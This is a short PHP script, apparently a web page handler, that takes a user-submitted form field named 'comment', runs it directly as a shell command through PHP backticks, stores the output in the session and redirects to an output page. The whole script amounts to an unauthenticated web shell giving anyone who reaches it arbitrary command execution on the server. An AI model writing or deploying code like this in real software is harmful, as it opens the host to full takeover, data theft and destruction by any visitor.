<?php 
session_start();
$coder=$_SESSION['code']=$_POST['comment'];
$_SESSION['output']=`$coder`;
if (strlen($_SESSION['output'])==0)
{
	$_SESSION['output']="The executed command does not exist.<br>Please enter the command carefully.";
	}
header("location:output.php");
?>